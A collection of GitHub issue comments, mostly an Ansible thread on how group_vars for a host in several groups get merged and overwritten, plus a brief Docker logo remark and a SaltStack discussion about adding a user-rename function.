moby/moby/18264/315269832,18264,@friend Thank you for pointing that out. The best solution would be for Docker to add some of those logos to the package they provide. But I understand they wouldn't add the black and white versions because of the risk of those being used more than the ones they already provide. I'll send the email with the artwork. ,,False
ansible/ansible/9065/43185309,9065,"Issue Type Bug Report Ansible Version ansible 1.6.1 Environment Mac OSX Summary If we have a hosts file [service1] www.host1.com  [service2] www.host1.com  and we have these group_vars group_vars/service1     database_host ""www.database.com""     database_port  3306  group_vars/service2     database_host ""www.differentdatabase.com""     database_port  3306  and we are running this playbook - hosts service1   remote_user root  the variables from group_vars/service1 and group_vars/service2 overwrite each other if we're deploying to the same server. This means service1 will get service2 groups variables and get the incorrect database host and port. to get around these, we've added DNS entries (aliases to www.host1-service.com) so our host looks like [service1] www.host1-service1.com  [service2] www.host1-service2.com  but this is highly error prone and is not ideal. What are some different methods to getting around this issue? (or misunderstanding of group_vars) The way I'm doing multi environmental deployments is like this inventory/stage/hosts inventory/stage/group_vars/ inventory/stage/group_vars/service1 inventory/stage/group_vars/service2  inventory/live/hosts inventory/live/group_vars/ inventory/live/group_vars/service1 inventory/live/group_vars/service2  Steps To Reproduce Summary describes how to reproduce this. Expected Results group_vars should not be overwritten by another group when sharing the same host Actual Results group_vars are overwritten by another group when sharing the same host ",,False
ansible/ansible/9065/62441380,9065,"I'm also having this issue, it seems like the vars get parsed and attached to the host rather than the staying with the group. Steps To Reproduce Hosts file [aaa] host1 host2  [bbb] host2 host3  [aaavars] foo=aaa  [bbbvars] foo=bbb  Run a command on each group $ ansible -i hosts aaa -m shell -a ""echo {{ foo }}"" host1 | success | rc=0 &gt;&gt; aaa  host2 | success | rc=0 &gt;&gt; bbb  $ ansible -i hosts bbb -m shell -a ""echo {{ foo }}"" host2 | success | rc=0 &gt;&gt; bbb  host3 | success | rc=0 &gt;&gt; bbb  Expected results The variable  is asigned to the group  and should be output when running commands against group Actual results host2 outputs the variable from group ",,False
ansible/ansible/9065/63641662,9065,"Have the same problem. Example ./group_vars/group1 ./group_vars/group2 hosts file So, when I'm trying to run playbook for group1 only, I'm getting this result ""name"" variable has a value ""group2-default"" but it`s expected to have a value ""group1"". Is there any workaround for this? ",,False
ansible/ansible/9065/63653763,9065,"inventory vars get merged even if you are not using that group, last group merged wins --  Brian Coca ",,False
ansible/ansible/9065/64718173,9065,"@friend Why does it work that way? Is this expected behaviour, or an actual bug? ",,False
ansible/ansible/9065/64719835,9065,"You could have vars/service(1,2,3,...) files And pass service=1 as extra vars Then for the hosts your targeting in the playbook use the service variable, as well as which vars file you are importing We do a similar thing for importing vars based on an environment extra var  On Nov 26, 2014 312 PM, ""arianitu"" notifications@friend.com wrote ",,False
ansible/ansible/9065/77694546,9065,"I have same issue on 1.8.4 today. Eventually, is this a correct behavior or not? Does anyone know the progress? ",,False
ansible/ansible/9065/77695853,9065,"Hmm. Seems like the tags 'bug_report' are wrong here. This is not a bug but.. a feature -) So yes, it is correct behaviour. As @friend said, ""the vars get parsed and attached to the host rather than the staying with the group"" which is totally correct. Variables in different groups where the same hosts are member, only makes sense when those groups are in a parent-child relation, the child winning, and it's vars applied. If groups are at the same level, there is not really a deterministic way which one will win. At playbook time targetting a group actually only determines which hosts are in the run, it doesn;t change anything at variable level. The ansible way here would be to set database host and port in a list, and the iterate over it in tasks. @friend @friend I think this issue can be closed. ",,False
ansible/ansible/9065/77696724,9065,@friend Thanks a lot! I got it. I'll try without using group_vars. ,,False
ansible/ansible/9065/77727695,9065,"closing as this is not a bug but by design, group vars get flattened per host and do not vary because of how you select the host ",,False
ansible/ansible/9065/97077453,9065,"Anyone got a workaround for this? we can't use static vars in the playbook, as we need to differenciate between different environments (handles by different inventory files) and need to run with different variables, depending on the group run, even tough they are run on the same host as another group ",,False
ansible/ansible/9065/98773719,9065,"Use a CNAME for the same hostname or an IP address.  This is the only workaround I found. The problem appears when you are using Ansible Tower, because you're wasting a license with such CNAME's. Ansible do not want to fix this bug calling it a ""feature"", but in fact it's a real bug that must be fixed. 28 Апр 2015 г. 1716 пользователь ""SkaveRat"" notifications@friend.com написал ",,False
ansible/ansible/9065/119500990,9065,It has been fixed but rejected.  annoying thing is that the ansible guide does recommend to group them by roles  if the same host has multiple roles with the same variables you can't use the group variables since you don't know which one will be used. ,,False
ansible/ansible/9065/148816278,9065,"I still don't understand how to bind a variable to a specific host for a specific playbook. I want the ability to use the same template, but with different configuration values depending on the environment I'm deploying to. We're already following  by making different inventories for our different environments Why does this seem so difficult with Ansible? Is Ansible just bad at doing environment based deployments? Please provide a full example, because ""The ansible way here would be to set database host and port in a list, and the iterate over it in tasks."" does not make any sense to me. Where is the environment specified here? For example, I have an authentication service that has a variable called  for stage, and  for live. Do you want me to have 2 variables? Now it's difficult for me to feed that to a common template file. I need to add if else checks throughout my j2 file (and we went down that path, but it was too much duplication and we got rid of it.) I have not found any documentation that handles this case, and it seems like a thing that should not be difficult to do. ",,False
ansible/ansible/9065/148862914,9065,"Here's how we do it AWS instance tagged as someapi prod playbook someapi.yml  hosts tagsomeapi{{ env }} gather_facts true user ec2-user vars_files  vars/aws_{{ env }}  tasks  fail msg=""Env must be defined"" when env is not defined roles someapi ...    Execution with extra vars ansible-playbook -vv someapi.yml -e ""env=prod"" roles/someapi/tasks/main.yml  name Include vars specific only to someapi. includevars someapi{{ env }}.yml  name Place config template src=config.j2 dest={{someapi_install_directory}}/configuration.properties ...   roles/someapi/vars/someapi_prod.yml authentication_db_host 192.168.2.4 roles/someapi/vars/someapi_stag.yml authentication_db_host 127.0.0.1 ... roles/someapi/templates/config.j2 authentication_db_host = {{ authentication_db_host }} ... HTH, --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Fri, Oct 16, 2015 at 1242 PM, arianitu notifications@friend.com wrote ",,False
ansible/ansible/9065/172346331,9065,Can Ansible detect such cases and make a warning with a possible solution hint? ,,False
ansible/ansible/9065/172353019,9065,"If I understand correctly how it works -- for future readers like myself who struggle to understand  Host groups in inventory files define groups of hosts. Group variables define what variables should be be set for the hosts in this group. When I specify a group to be used to play a playbook, this means to take all the hosts which belong to that group. Each play is played separately for each host -- there is no context which group is being deployed. Groups are used to group hosts and group vars -- to set common variables to those hosts. So if a host is mentioned in several groups and these groups have the same variable with different values, the host is told that because it belongs to the first group -- the variable for it is set to the group value; then because the host belongs to another group the same variable with a different value is set shadowing the previous value.  ",,False
ansible/ansible/9065/172385576,9065,"The main problem is that ansible merge variables even from groups I don't want to play right now. I don't need to check variables from group I'm not playing at this time. Maybe, the semi solution is to check for variables only that groups, which was scheduled to run playbook. вс, 17 Янв 2016, 2000, Victor Varvaryuk notifications@friend.com ",,False
ansible/ansible/9065/215475122,9065,"This seems very counter-intuitive. I have an inventory which just has my Vagrant box in each group for testing purposes. But even when I run a playbook which just references a single group, Ansible is pulling in variables from the other groups too which is breaking my testing. ",,False
ansible/ansible/9065/215534411,9065,"On 28 April 2016 at 1755, Philip Wigg notifications@friend.com wrote ​That is because the mental model you use to look at inventory is not the correct one.​ ​Do not look at the inventory as tightly coupled with playbooks. Inventory is pretty much a separate thing, where  hosts can be member of several groups, and as such be targetted from ansible​ (ad-hoc) or ansible-playbook (playbooks) by pointing to one of the groups that host is member of. resolving variables is done inventory-wide, whether you target a specific group, or the allmighty built-in 'all' group, doesn't change that variables are and inherited, resolved  and calculated by looking at all group definitions and all group variables that exist in the inventory.  HTH, Serge ",,False
ansible/ansible/9065/217134678,9065,"I'm bumping into this too. In my case I have a role which installs vhosts. I set the details for the multiple vhosts as an array in my inventory for the server groups, in other words each group can have multiple vhosts. This works well, I define the vhosts for each group and everything seems neat and tidy. The problem comes up when the host is in more than one group, in that case the vhost array in the inventory is overwritten and the last group wins, so only half my vhosts end up being provisioned. An alternative would be to put the vhosts in the hosts instead of in the group, but that doesn't seem clean because I'll have to duplicate for all servers which are in the same group. Can anybody point me in the direction of a better way to do this or to work around it? I feel like I may be abusing the concept of roles or inventory by having my ""vhosts"" role accept an array of vhosts (a vhost is not exactly a ""role"" in the sense that you don't say to a server ""you are a vhost""). Can anyone offer a better way to do it or share their thoughts? ",,False
ansible/ansible/9065/217135162,9065,"By the way, @friend, thank you for taking the time to respond to me - it was much appreciated and has clarified my understanding. ",,False
ansible/ansible/9065/227450640,9065,My solution is. [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com ,,False
ansible/ansible/9065/236345364,9065,"This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host. ",,False
ansible/ansible/9065/240712445,9065,"This i very anoying to have group_vars loaded randomly. It make impossible to have inheritance in a such case all &gt; datacenter &gt; environment (integ, devel, prod) &gt; application &gt; host It's very easy to do with puppet hiera but with ansible it's a pain, and, when you have &gt; 100 playbooks/roles to maintain, load variables explicitely is not a must have because you should maintain a vars_file + a group_vars file for the same function. Maybe having a tag in the file (vars_priority) or use the filename to fix the loading order could be good (like apache for example), example  all.yml 10_datacenter_a.yml 10_datacenter_b.yml 20_env_production.yml 40_app_gitlab.yml  then gitlab load group vars per name. ",,False
ansible/ansible/9065/246864287,9065,"I'm really happy to see that I'm not alone in this none sense! Groups vars should do apply the HIS group of hosts period. How in the world the --limit directive should be explain than? The natural way of thinking is  ok I ""limit"" this play book to host in THAT group so THAT group of vars gets pick up!!!! Not variable define in other groups for that same host, that doesn't make any sense! I hope this get fix and in the mean time, I fallback to use multiple DNS entry for the same host. ",,False
ansible/ansible/9065/249961581,9065,Just spent several hours banging my head on the table trying to get around this issue.  With the amount of chatter this issue is getting I'm really surprised Ansible (or Red Hat) is allowing this to continue. ,,False
ansible/ansible/9065/249967998,9065,"Why rely on the group_vars abstraction to merge vars and determine what is needed in the first place? I can't think of a good reason not to explicitly define and include vars (simplest example is included above in the thread) --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Tue, Sep 27, 2016 at 1153 AM, Jason Hane notifications@friend.com wrote ",,False
ansible/ansible/9065/249975938,9065,"Part of the issue is that it's not immediately clear that's how Ansible parses variables.  One would think (as evidenced by the number of people having this problem) that assigning a host to a group, and running only that group, would inherit the variables for only that group and not of all of the groups that host is in. Running all hosts is a different story but at least then it should be a clear assumption that Ansible would grab all variables for all groups that host is in.  Ansible should either do a better job making those assumptions clear or provide a flag that enables this behavior. ",,False
ansible/ansible/9065/250009349,9065,"needed in the first place? That's EXACTLY the point of an abstraction! If the tool let me abstract my environment in different groups and then by applying clear rules of inference deduce which variables should be use, why not use it?!? So there's 2 problems here  The rules and not clear or the abstraction is not working. Otherwise, explain me the purpose of groups_vars if I need to explicitly define and include vars? I'm must say that the documentation do not mention this specific case of same host been included in multiple group_vars. But this case is very real in host where multiple instance of service exist (ex. apache). I really hope this problem being solve soon. ",,False
ansible/ansible/9065/250010207,9065,"We have found a way to solve our app/env problem with variables inheritance by cross defining variables between groups using a prefix. for example app_collectd.yml collectd_host ""{{ env_collectd_host }}"" env_production.yml env_collectd_host 1.1.1.1 then it's now not a problem, we have a clear app variables + env variables using cross calling variables ",,False
ansible/ansible/9065/250020640,9065,I'm coming from Puppet-land where doing abstraction and code reuse is simple and clear.  Maybe I don't understand correctly how Ansible approaches this so if there is a better way  that doesn't involve group_vars I'm all ears.  What I don't want to have to do is maintain another set of variables for each host or group to specify where it should be getting its variables.  To me that should be the responsibility of the framework.  This is the beauty of hiera in Puppet. ,,False
ansible/ansible/9065/256384769,9065,@friend [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com can you explain it in detail? ,,False
ansible/ansible/9065/258252988,9065,"One more victim here. Anyone figure out a good solution for the following scenario? Let's say I have a list of web applications (app-a, app-b, app-c). And there are 4 hosts in 2 DC for DR/Load-balancing. I want to use ansible to simplify deployment. My first instinct is to use group vars, obviously I failed, but what alternative Ansible provides? inventory http_port 8081 app-c  host {{app-name}} tasks  # deploy application with given {{http_port}}.... ♠`  ",,False
ansible/ansible/9065/258254749,9065,This is what I do to get around it ,,False
ansible/ansible/9065/258446783,9065,"@friend Thanks, that certainly points to a direction I wasn't aware of.  However, I am now more incline to use roles for code reuse, and declare variables directly in playbook. Even though that means I will have one playbook per app, but by declare variable right next to the role which will use it, make the entire config much easier to understand. ",,False
ansible/ansible/9065/268755726,9065,"@friend Thanks, this workaround is brilliant.  You saved me. ",,False
ansible/ansible/9065/269788749,9065,"@friend Genius! I'm so surprised that this is even an issue.  I'm running into it because I have a single role I use with multiple inventory groups that have associated group_var files.  In QA/Prod, this is not an issue, because each inventory group has different servers.  But for integration level environments, we tend to smash everything together on to single servers (which is why I'm seeing this issue). Following hanej's advice, I modified my playbook yml to just explicitly load the group_var file♠hosts publish vars_files  group_vars/publish.yml`  ",,False
ansible/ansible/9065/271255544,9065,"""This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host."" Just to update this ""ISSUE""/""LIMITATION"" OK, we can use a workaround to eliminate the conflict, ( with host ansible or other way ) but the best way should be to purpose variable in the ansible.cfg to define  ""enclose group_vars"" or ""merge group_vars"" ",,False
ansible/ansible/9065/271326486,9065,"I can't use group_vars just for this reason.  We have multiple hosts in multiple groups (DC, environment, application, etc) and we have no control over how the variables are read.  Coming over from Puppet using Hiera this is a huge deal.  In my opinion, Ansible should adopt something like Hiera using the ""roles and profiles"" pattern where you can specify the order of how variables are consumed based on facts or groups.  I kind of do this now using the approach above. For instance, if you have a host in a role called ""/Linux Hosts/Applications/Java/Website"" you should be able to inherit variables from Linux Hosts (global level variables like sysctl, DNS, NTP, etc), Applications (global application level variables), Java (java specific variables like JDK version, JAVA_HOME, etc), and Website (variables related specifically to the website application).  The further you go down in the tree the more specific the variables become, which can override the variables higher up. Using Ansible for event driven or adhoc runs is great and works very well, however I'm finding that using Ansible for configuration management is not as clean or easy to use as Puppet and Hiera mostly for this reason. ",,False
ansible/ansible/9065/271624866,9065,"2 years later, I'm still receiving a steady stream of e-mails on this issue (it's also one of the most commented issues in this github.) Do the Ansible maintainers still feel like the current behaviour is correct, even though it's very unintuitive? You guys need to seriously document on how to do configuration management with Ansible because anyone trying to do application deployment with this project is having a terrible time. We've decided to stop using Ansible entirely. It sucks at configuration management, period. Good luck with the project. ",,False
ansible/ansible/9065/271898601,9065,"Yeah, just ran into the same problem when configuring the deployment process for config files for different environments, while testing on the same host. I'm going to adopt the whole {{ app-name }}-{{env}}.yml method proposed by @friend , but would love for the group_vars behaviour to at least be configurable. ",,False
ansible/ansible/9065/273740924,9065,"Happy I found this issue after banging my head against the wall for countless hours... And I'm extremely surprised of the maintainers dismissive attitude regarding this bug by calling it a ""feature"", it's stupid beyond recognition. I'm trying to set up a generic deployment playbook/role using a dynamic inventory. The inventory output looks like this Unfortunately there can be multiple applications on a single host. The whole point by using a dynamic inventory evaporates if the group vars are 'randomly' mashed up and returned instead of  inherit the variables for only that group which I'm running --limit with I tried @friend workaround by implementing the json like this _""hosts"" [""host2 ansible_host=host1.example.com"", ""host2 ansiblehost=host2.example.com""] but Ansible clearly don't understand that trying to ssh to host1 ansible_host=host1.example.com Anyone else facing the same problem, and if so have a possible workaround? I could pass the port and pool variables on the command line as they precedence, but then I have to do some ugly lookup before. ",,False
ansible/ansible/9065/274021960,9065,"Was having a great time with Ansible until hitting this bug. I had a perfect abstraction that would allow configuration of the same apps on a multi-tiered environment, and also on an all-in-one test environment - alas, I was wrong. What seemed like one of the most powerful features of Ansible doesn't work like everyone would expect it to. Please, lets get this fixed. ",,False
ansible/ansible/9065/278293382,9065,Spent hours banging my head on the table trying to get around this issue. Please fix this issue. ,,False
ansible/ansible/9065/282040497,9065,"This ""feature"" wasted the better part of my day. Not amused. @friend Thanks for the rather elegant workaround. We're now setting an  variable in our  files to the name of the environment. In our playbooks we then do this ",,False
ansible/ansible/9065/282311773,9065,"I know that it's been 2.5 years and that Ansible will probably never look at this, but I'm just going to add my frustration with this. Why allow users to put a host in multiple groups if you can't use the groups separately? ",,False
ansible/ansible/9065/282317090,9065,That's my problem with Ansible devs. Looks like they think only about themselves. They could at least try make the frustration less issuing some warnings. They instead prefer to spit. ,,False
ansible/ansible/9065/284079503,9065,"We filter out closed issues and don't see comments on them, but someone pinged me to respond to some of these questions. If you want attention from devs the mailing list or IRC are better conduits than closed tickets. Ansible looks at groups as properties of a host. For example,  you can have a host be part of webserver group (to install a webserver reqs) and part of the northeast_datacenter group (so you know the network gateway, ntp and dns servers to set) also part of the dev_group to install dev tools and point to the non-production database, etc, etc. You CAN use the groups as a way to target hosts but that does not mean the other 'host properties' disappear. I am in the 'males' group and in the 'programmers' group, just because you 'select me' as a programmer I do not stop being male. In the end this is a design decision (not a bug) on how to tackle groups, a way to classify and add properties to hosts. I know other tools use them differently but that is not a reason to change how they work in Ansible, as there is no uniform way ALL other tools use groups, many others look at them this way many don't. This has the limitation of not being able to reuse variable names and only have the 'current group apply' but it  has the advantage of always seeing the bigger picture of how the host is defined and makes conflicts easy to spot or resolve. In most of the cases above a use of vars_files or include_vars seems more appropriate than setting up as groups, when talking about application specific variables. Doing include_vars on group_vars ... well that is not how we designed it, but if it works for you ... the caveat is that you are 'double loading' as group_vars are automatically pulled in, this can lead to performance issues on large inventories.  We recommend more specific,  or similar with include_vars. I hope this clarifies why groups work the way they do in Ansible and why that is different than 'another specific tool', let me know if there is anything I can add to our docs  to clarify and avoid frustration. I would love to accommodate everyone's way of working, Ansible is very flexible in some areas, but not in this respect and I don't see a good way to make it so nor a sane way to share playbooks afterwards. If I'm wrong, I look forward to your pull request. ",,False
ansible/ansible/9065/284136852,9065,"@friend is it possible to detect cases when the group vars are being used in a strange way (sorry, cannot formulate this better -- haven't used this for a long time) and make warnings to help users save their time? ",,False
ansible/ansible/9065/286276778,9065,"@friend What's unclear to me, and I think most of the rest of the commentators on this issue, is what value the Ansible team is looking to preserve by keeping group_var precedence/resolution the way that it is. Can you give an example of a case which is satisfied well by the current solution but would cease to be so if, say, group_vars are only loaded for the groups selected for a given play, rather than for the entire inventory? It seems quite easy to come up with examples which are broken by the way that it is now. ",,False
ansible/ansible/9065/286286224,9065,"I understand @friend's point as we use it that way too.  My biggest frustration with Ansible is it works mostly good for either configuration management or ad-hoc workflows.  It doesn't do a great job of either but it's getting better and it has plugin support which I think I will be using to make another issue I have with it better.  Most days I still miss Puppet solely for configuration management... Probably the best use case for group_vars is multiple datacenters.  Let's say your inventory file looks thusly You could use group_vars to set datacenter specific variables that would be inherited by all hosts in that datacenter. dc1.yml dc2.yml Using group_vars like this is fine until you need to merge or override a variable in another group_var file.  This is another case where group_vars breaks down.  There's no way to set the order in which variables are read in group_vars.  A hierarchical layout (like Hiera) that can be determined by facts and not by groups for things like environmental variables comes to mind here but I digress. From my perspective, this use case is mostly good for straight configuration management but it's not so great at deployments or ad-hoc scripts.  This is why I would love to see a switch to disable this feature for certain playbooks where you don't want to do this. ",,False
ansible/ansible/9065/286302551,9065,"@friend I'm not sure how that example breaks by the design change I suggested in my previous comment? Given the inventory you've listed, if I  Any  you'd write against that inventory would have to be fairly contrived in order to make it break when only  and  were broken. I agree that deployments are an issue. Multi-tenanted deployments, specifically. I have two concerns with the way things work now First, lack of configuration namespacing. Specifically, if I'm maintaining configuration for some applications in a multi-tenanted environment, how do I ensure that someone maintaining a different app which happens to run on the same machines isn't going to add a variable name which conflicts with mine, or that I won't add one which conflicts with theirs? Second, the case everyone keeps talking about here. I'd expect that with the below inventory, I'd never wind up with files written to  when I run , and that files would never be written to  when I run These two issues are bad enough on their own, but in a large company where many people in different timezones might be editing the same inventory, the current solution seems more than a little risky. Example inventory. app1_staging.yml app1_prod.yml ",,False
ansible/ansible/9065/286302663,9065,"Don't know if the edit worked to adjust the notification, by my last comment was meant to be directed to @friend. ",,False
ansible/ansible/9065/286749786,9065,"@friend You asked for an example of using group_vars that satisfies the current loading method but breaks if only using the immediate groups.  I provided that with the datacenter example.  If Ansible doesn't load variables for all groups, then you cannot set variables, for example, at a datacenter level. I believe this should be a toggle in ansible.cfg or on the command line so you can specify how to load group_vars so it doesn't break the existing use cases.  We have multi-tenant environments here and used to get bit by this until I stopped using group_vars. I'm not sure if you've heard of the roles and profiles pattern but it's a really good read and I highly recommend this approach if you're using any kind of configuration management tool.  It was written for Puppet but it applies for all tools.  You probably wouldn't use this for deployments or ad-hoc stuff but for straight configuration management it's great. ",,False
ansible/ansible/9065/288386733,9065,"I use docker hosts so it is quite normal to have different instances of containers in different environments spread across hosts and this bit me. Thanks to @friend for the workaround and I would also add group vars do not work as advertised and seem to be broken by design. My workaround is to define a play as follows Put a vars directory in the playbook dir with group1.yml, group2.yml in there. ",,False
ansible/ansible/9065/292715778,9065,"I just joined victim list today after 1 hour debugging and fortunate enough to found this post. I think it's only documentation problem, no one will complain if it's clearly noted in here  fact that variables are associated with hosts, and groups is just a convenience way to set variables to all hosts belong to it. Variables will be overriden if the same host is used in multiple groups. ",,False
ansible/ansible/9065/297557842,9065,plus one This issue affects our software team. ,,False
ansible/ansible/9065/298290703,9065,Also encountered this issue when deploying several groups to the same hosts. Needed a way to vary a port for each group and use that port in a template which iterates though hosts of groups. (haproxy) ,,False
ansible/ansible/9065/309037565,9065,"Unfortunately we also ran into this issue today. Same story, Though we have a generic ""tomcat"" rol we vary the variables like port numbers based upon the group that is used. However several tomcat instances can be deployed to the same physical servers so we created multiple groups in the inventories that contain the same set of servers. However this approach doesn't seem to work. I have no idea yet how to design this. I cant create wrapper roles that have the variables because some of the variables are actually specific to the inventory. Think for example a database password oid. ",,False
ansible/ansible/9065/309044194,9065,"I recently found this which eased my pain with this issue  allows merging of variables no matter where they were defined, so you can merge two dicts/lists in two different groups for example, as opposed to one group winning and overwriting the variable defined in the other groups as is the current behavior. The plugin only works with Ansible 2+. A good article explaining the concept and the use case can be found here. ",,False
ansible/ansible/9065/310256170,9065,"We recently come into this issue as well. We have multiple applications running on a single host as different users. For instance We have no way to specify  with vars properly, neither with  nor . The latest definition always wins in both cases. Our current workaround is to define multiple plays with different  in the playbook ",,False
ansible/ansible/9065/310269683,9065,"@friend suggested a smart way above to workaround this So now each host has a unique name in the inventory. Not a big fan to put host vars in inventory, but this is the best workaround I have seen so far. ",,False
ansible/ansible/9065/310374537,9065,"@friend I think you are missing the points of hostvars and directives should work as long as you dont set ansible_user. The groups are a property of the host, not an entity to themselves. ",,False
ansible/ansible/9065/311318799,9065,"There was a proposal to make it possible to write proper plugins for inventory management. I suspect now that this proposal was closed/finished, it should become possible to implement a dynamic inventory plugin which works around this point of confusion. ",,False
ansible/ansible/9065/314836106,9065,"Going to plus one to question the ansible design here. In the real world, many different applications can run on the same host. Scoping group_vars at the host-level simply doesn't cover this use-case. Just as a thought experiment  Let's assume that the default behavior was modified so that running ansible-playbook with the ""-l"" option uses the group_vars child file (if it exists).  You could still handle the ""datacenter"" use-case that was mentioned through parent groups. All that would change is that the ""named"" child group for a host match would win the inheritence battle, instead of the ""last"" child group for a host match.  Making this small change would make hundreds of DevOps-y people happy, and would hurt nobody. ",,False
ansible/ansible/9065/318955846,9065,"From my previous comment, see  for a potential avenue to allow more pluggable behaviour here. ",,False
ansible/ansible/9065/341348002,9065,Can't believe that Ansible do not fix or reply on this issue.  It took me a few hours to debug. ,,False
ansible/ansible/9065/341355139,9065,"Can't believe that Ansible do not fix(give hints, warning) or reply more on this issue.  It took me a few hours to debug. ",,False
ansible/ansible/9065/350467146,9065,"I encountered this as well.  One approach was to use nested variables.  So take inventory group my_app_servers for example, and it lines up with the file my_app_servers.yml inside your group_vars, and you've got more than one application to manage on a common host.  I nested them like this Example my_app_servers.yml application_env   - application1   - application2  application_environments   application1      app1_port 8080     app1_conf_dir ""/somedirectory/conf""     app1_logs_dir ""/somedirectory/logs""     app1_app_install_name app1prd     application2       app2_port 8081      app2_conf_dir ""/somedirectory/conf""      app2_logs_dir ""/somedirectory/logs""      app2_app_install_name app2prd  In your main.yml, define a loop, and iterate over the nested variable list like this, with_items ""{{ application_env }}""   loop_control     loop_var application_env_item Then in your tasks, you can grab the nested variable that you want, to execute something. {{application_environments[application_env_item]['app1_app_install_name']}} (if you can pull one var out of that list, you can get the rest.). Hope that helps. ",,False
ansible/ansible/9065/379246209,9065,"This issue (#9065) was closed back in 2015. Same #6538. Same #6666. And many more.  Here is 2018, 4 years after many issues were open, and apparently it's more hot than it was at the beginning, and everyone lost hours due to a counter-intuitive design. This sounds like an alarm on the design. IMHO this needs to be reviewed and fixed. If everyone will continue use hacks and make ansible code ugly due to conditional var file includes, or inventories like ""[service1] host1 ansible_ssh_user=host1.com"", or additional libs to fix core functionality, ansible will be less attractive. IMHO these hacks don't seem aligned with the ansible's ""Simple IT Automation""  motto. @friend -&gt; What should be the trigger to have someone reevaluate PR #6666, or something similar that ""just works intuitively""? ",,False
ansible/ansible/9065/379256290,9065,I think group_vars themselves should be able to be prioritized.  Hiera for Puppet got it right.  You can specify how lookups are done based on facts or groups.  Let the end user be able to customize how group_vars should be processed and provide a mechanism to easily see the order in which Ansible is applying those variables. ,,False
ansible/ansible/9065/383963162,9065,"FYI, we dont normally see notifications on closed issues, responding here because someone pointed me at this, I'm also going to lock so people don't keep commenting in a forum maintainers won't see. @friend i think you want  and  configuration. @friend  open a proposal, but this is about a fundamental focus of each diff app. Ansible focuses on a task for a host, the other tools you mention focus on a much more complex structure. For ansible 'groups' are just a property of a host, not a principal entity,  the other tools focus on groups as 'the main context' and everything else is added onto that. I don't see either approach as 'wrong', just different. Trying to make Ansible work in such a way will break the simplicity paradigm, focus on A host and A task for what is just an organizational focus and transposing what i see as the 'accustomed way of thinking'  people bring from other tools. I would argue that this is just a perception on data organization and habits, but that is just my opinion. Feel free to submit a proposal, if you convince and gain enough traction with maintainers you might get the change you want, I just don't think it is a change we need. ",,False
salt/saltstack/15511/41905806,15511,"Please provide a function to rename OS users. In GNU/Linux this can be done by using . See  I think that OS X uses similar attitude. It should be possible to rename user in Windows either (I've done it using Control Panel). After adding this function,  state should not fail if user provides  that is already used by the user with different name, but rename the user. ",,False
salt/saltstack/15511/54541579,15511,"Seems very reasonable, thanks for the request. ",,False
salt/saltstack/15511/54574783,15511,"Looking into this.  Looks pretty straightforward, only question will be Windows.  Might need to consult with @friend ",,False
salt/saltstack/15511/54584781,15511,Only implemented functions to rename user.  Need to think about the changes to the state function.  Right now it attempts to run the respective add and if it fails reports back that the user add failed.  We could at that point attempt to rename the user but would need to know that it failed because of something like UID already existing. ,,False
salt/saltstack/15511/54647159,15511,"I'm actually not convinced that we should change the state.  I feel like we're assuming too much at that point -- if we accidentally put in a UID that already exists, it's going to rename the user?  That seems like asking for trouble.  If we want to add renaming to the state, we should hide it under a new argument. ",,False
salt/saltstack/15511/54650144,15511,"I was thinking about including an additional argument to the present function, rename or rename_on_fail or something, but you're right it opens up a whole can of worms for potential error cases.  Maybe just adding a new state function to rename users and make the error reporting on a failure in the present function better about reporting that the UID already exists for another user. ",,False
salt/saltstack/15511/54660817,15511,"I just feel like renaming users is one of those things that's just not designed to be idempotent.  I feel like if you need to do a user rename, you use remote execution () out of band of your states.  But maybe there's a case for allowing it within states. ",,False
salt/saltstack/15511/54661299,15511,"Not totally sold on the idea either.  The rename function is now in develop, we could let it sit and see if that meets the need, then revisit the second part of this request if the use case arises. ",,False
salt/saltstack/15511/54662598,15511,"Agreed.  I am going to close this as resolved for now, pending further discussion. ",,False
salt/saltstack/15511/54662733,15511,"Wait, wait! Use case I've prepared an image of openSUSE distribution for programmers of the company I'm working at. I've included default user named 'programmer'. But I want real username and hostname, based on this username. After the first load AutoYaST + my scripts ask username save it into grains ( requires user), makes appropriate hostname and , and starts salt. Salt renames user and manages files. I think shipping image without users at all and creating first user using salt would be inflexible, because I couldn't even load X11 if salt don't create user (due the lack of connection, for example). ",,False
salt/saltstack/15511/54662956,15511,Do you have to rename the user?  Couldn't you simply create the new user for the person who will be using the machine? ,,False
salt/saltstack/15511/54663942,15511,"Just after the answering to AutoYaST questions openSUSE loads with the  user. That means that the home directory is populated with files. I don't need this directory. Well, I can delete the user (and the home directory) via additional state, but I cannot do it while this user is running KDE. Also my state assumes that home folder of the real user is already in a correct state, but that's not true until I login to the KDE for the first time. Also KDE don't want to load if it finds some files under the  directory. That means that I need to reboot the machine manually anyway before my highstate. And one more thing some distributions (including openSUSE) disable auto login when there are multiple users in the system. I don't want that. You see, it's not so simple, as it appears on the first blush. ",,False
salt/saltstack/15511/54665247,15511,"So at that point I would lean towards using  with an  I still don't think it's something that necessarily belongs in the  state.  (I will also note I haven't actually looked at @friend's new rename code, so I'm sure the above example uses the wrong argument names) ",,False
salt/saltstack/15511/54665445,15511,Pretty close )  old = name and new = new_name. ,,False
